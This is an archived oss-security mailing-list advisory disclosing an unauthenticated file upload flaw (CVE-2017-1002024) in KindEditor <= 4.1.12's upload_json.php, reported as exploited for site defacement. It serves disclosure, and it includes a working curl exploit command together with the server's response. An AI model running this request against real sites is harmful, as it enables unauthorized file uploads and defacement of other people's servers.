X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1624" "Wednesday" "5" "July" "2017" "11:22:54" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<FEB98110-2F76-4716-84F8-3F26EC9D91DA@me.com>" "40" "[oss-security] File upload vulnerability in Kindeditor <= 4.1.12" "^Date:" nil nil "7" "2017070515:22:54" "[oss-security] File upload vulnerability in Kindeditor <= 4.1.12" (number mark "        larry0@me.co Jul  5   40/1624  " thread-indent "\"[oss-security] File upload vulnerability in Kindeditor <= 4.1.12\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 24487 invoked by uid 550); 5 Jul 2017 15:23:09 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 24466 invoked from network); 5 Jul 2017 15:23:08 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=04042017;
	t=1499268176; bh=TeE/0CtvBvNa1mGb7Y5yoW0bv8I1kas86GFTcRcMuk8=;
	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
	b=xqxqkwzusjPrd9rrM/+iCbIyXwpqgibrgtc3PUBBdnsZM78N1V0kbPVZPv+sgi0cM
 4IjqWEEFVP2SiRunykjmUMjBfvQB8L8fdW2+Y9ChH5Glm8ImeHJvsPR8DQWVu61VG0
 Zx/2REPcET/7o3711BQTJJ3baKmYqhTgi3UxLSQCUzKch+wlPCHc30iuUws+U0v76H
 py74fS3cSDHEXFoChutsKv0MP3GTLmNxJTGEFaD+u19Yh2P4icxh7oSeN8UxvqNlPL
 UgyCjjdZqtnSdXlT9ZiALcfRBVrv4rt9HuA+tGiIPxKexd6O8d7unNKksqW5lRNQ3y
 fBGD3ViUKIHOA==
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2017-07-05_10:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1034 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1701120000 definitions=main-1707050260
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Message-id: <FEB98110-2F76-4716-84F8-3F26EC9D91DA@me.com>
MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
X-Mailer: Apple Mail (2.3124)
Date: Wed, 05 Jul 2017 11:22:54 -0400
From: "Larry W. Cashdollar" <larry0@me.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] File upload vulnerability in Kindeditor <= 4.1.12
To: Open Source Security <oss-security@lists.openwall.com>

Title: File upload vulnerability in Kindeditor <=3D 4.1.12
Author: Larry W. Cashdollar, @_larry0
Date: 2017-06-14
CVE-ID:[CVE-2017-1002024]
Download Site: http://kindeditor.org/ https://github.com/kindsoft/kindedito=
r/
Vendor: KindSoft
Vendor Notified: 2017-06-15
Vendor Contact:
Advisory: http://www.vapidlabs.com/advisory.php?v=3D195
Description: KindEditor is a lightweight, Open Source(LGPL), cross browser,=
 web based WYSIWYG HTML editor. KindEditor has the ability to convert stand=
ard text areas to rich text editing.
Vulnerability:
It appears there is a remote file upload vulnerability in kindeditor<=3D 4.=
1.12 specifically in kindeditor/php/upload_json.php. The file doesn't sanit=
ize user input or check that a user should be uploading files to the system=
.  It appears it doesn't allow .php, phtml, shtml or other executable exten=
sions. You can upload .html and call it as its uploaded to the web server p=
ath. But no server side code exec.

Exploit Code:
	=E2=80=A2 A simple curl request to kindeditor/php/upload_json.php?dir=3Dfi=
le with the data filename=3Dtest.html set via POST request is all that's re=
quire to exploit this vulnerability:
	=E2=80=A2=20=20
	=E2=80=A2 $ curl -F "imgFile=3D@test.html" http://example.com/kindeditor/p=
hp/upload_json.php?dir=3Dfile
	=E2=80=A2=20=20
	=E2=80=A2 {"error":0,"url":"/kindeditor/php/../attached/file/20170613/2017=
0613203236_37481.html"}


This vulnerability is being actively exploited in the wild to deface sites.=
  The software vendor has not responded to the issue I posted three weeks a=
go.

https://github.com/kindsoft/kindeditor/issues/249


